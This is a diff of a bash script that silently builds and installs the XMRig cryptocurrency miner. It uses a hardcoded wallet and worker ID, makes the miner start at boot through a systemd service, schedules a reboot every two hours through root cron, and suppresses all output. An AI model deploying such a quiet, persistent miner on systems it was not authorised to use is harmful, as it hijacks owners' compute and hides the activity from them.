@@ -1,8 +1,7 @@
 #!/bin/bash
-# xmrig_setup.sh
-# Setup XMRig miner on Ubuntu with auto start and reboot every 2 hours
-# Usage: sudo bash xmrig_setup.sh [WORKER_ID]
-# Default WORKER_ID = A00001
+# xmrig_setup_quiet.sh
+# Quiet XMRig miner setup with no output except final message
+# Usage: sudo bash xmrig_setup_quiet.sh [WORKER_ID]
 
 set -euo pipefail
 
@@ -10,50 +9,42 @@ BASE_WALLET="42ZN85ZmYaKMSVZaF7hz7KCSVe73MBxH1JjJg3uQdY9d8ZcYZBCDkvoeJ5YmevGb6cP
 WORKER_ID="${1:-A00001}"
 WALLET="$BASE_WALLET.$WORKER_ID"
 
-echo "Using wallet: $WALLET"
-
 CPU_CORES=$(nproc)
 THREADS=$(( CPU_CORES > 1 ? CPU_CORES - 1 : 1 ))
-echo "Mining on $THREADS threads (CPU cores: $CPU_CORES)"
 
-echo "Updating system and installing dependencies..."
-sudo apt update
-sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev screen curl libcap2-bin
+{
+  sudo apt update -qq
+  sudo apt install -y -qq git build-essential cmake libuv1-dev libssl-dev libhwloc-dev screen curl libcap2-bin
 
-echo "Configuring system limits..."
-echo -e "* soft memlock 262144\n* hard memlock 262144" | sudo tee -a /etc/security/limits.conf
+  # Update limits.conf only if needed
+  grep -qxF "* soft memlock 262144" /etc/security/limits.conf || echo -e "* soft memlock 262144\n* hard memlock 262144" | sudo tee -a /etc/security/limits.conf > /dev/null
 
-for f in /etc/pam.d/common-session /etc/pam.d/common-session-noninteractive; do
-  if ! grep -q pam_limits.so "$f"; then
-    echo 'session required pam_limits.so' | sudo tee -a "$f"
+  for f in /etc/pam.d/common-session /etc/pam.d/common-session-noninteractive; do
+    if ! grep -q pam_limits.so "$f"; then
+      echo 'session required pam_limits.so' | sudo tee -a "$f" > /dev/null
+    fi
+  done
+
+  grep -qxF "vm.nr_hugepages=128" /etc/sysctl.conf || echo "vm.nr_hugepages=128" | sudo tee -a /etc/sysctl.conf > /dev/null
+  sudo sysctl -p -q
+
+  sudo setcap cap_sys_nice=eip "$(which screen)" >/dev/null 2>&1
+
+  cd /root
+
+  if [ ! -d xmrig ]; then
+    git clone -q https://github.com/xmrig/xmrig.git
   fi
-done
 
-echo "Setting hugepages..."
-if ! grep -q '^vm.nr_hugepages=128' /etc/sysctl.conf; then
-  echo 'vm.nr_hugepages=128' | sudo tee -a /etc/sysctl.conf
-fi
-sudo sysctl -p
+  cd xmrig
+  mkdir -p build
+  cd build
 
-echo "Setting capabilities for screen..."
-sudo setcap cap_sys_nice=eip "$(which screen)"
+  cmake .. -Wno-dev > /dev/null 2>&1
+  make -j"$CPU_CORES" > /dev/null 2>&1
 
-echo "Preparing XMRig source..."
-cd /root
-if [ ! -d xmrig ]; then
-  git clone https://github.com/xmrig/xmrig.git
-fi
-
-cd xmrig
-mkdir -p build
-cd build
-
-echo "Building XMRig..."
-cmake ..
-make -j"$CPU_CORES"
-
-echo "Creating systemd service file..."
-sudo tee /etc/systemd/system/xmrig.service > /dev/null <<EOF
+  # Create systemd service
+  sudo tee /etc/systemd/system/xmrig.service > /dev/null <<EOF
 [Unit]
 Description=XMRig Miner Service
 After=network-online.target
@@ -72,29 +63,21 @@ StandardError=null
 WantedBy=multi-user.target
 EOF
 
-echo "Reloading systemd daemon and enabling xmrig service..."
-sudo chmod 644 /etc/systemd/system/xmrig.service
-sudo systemctl daemon-reload
-sudo systemctl enable xmrig
+  sudo chmod 644 /etc/systemd/system/xmrig.service
+  sudo systemctl daemon-reload
+  sudo systemctl enable xmrig --quiet
 
-if systemctl is-enabled xmrig &>/dev/null; then
-  echo "Service 'xmrig' enabled to start on boot."
-else
-  echo "Error: Service 'xmrig' not enabled on boot."
-  exit 1
-fi
+  sudo systemctl start xmrig
 
-echo "Starting xmrig service..."
-sudo systemctl start xmrig
+  # Schedule reboot every 2 hours
+  (sudo crontab -l 2>/dev/null; echo "0 */2 * * * /sbin/reboot") | sudo crontab - >/dev/null 2>&1
+} >/dev/null 2>&1
 
-echo "Scheduling reboot every 2 hours..."
-(sudo crontab -l 2>/dev/null; echo "0 */2 * * * /sbin/reboot") | sudo crontab -
-
-if sudo crontab -l | grep -q '/sbin/reboot'; then
+# Final status checks and output
+if sudo systemctl is-enabled xmrig &>/dev/null && sudo systemctl is-active xmrig &>/dev/null && sudo crontab -l 2>/dev/null | grep -q '/sbin/reboot'; then
+  echo "Setup complete. Miner running with wallet $WALLET."
   echo "Reboot scheduled every 2 hours."
 else
-  echo "Error: Failed to schedule reboot."
+  echo "Setup failed. Check manually."
   exit 1
 fi
-
-echo "Setup complete. Miner is running with wallet $WALLET."
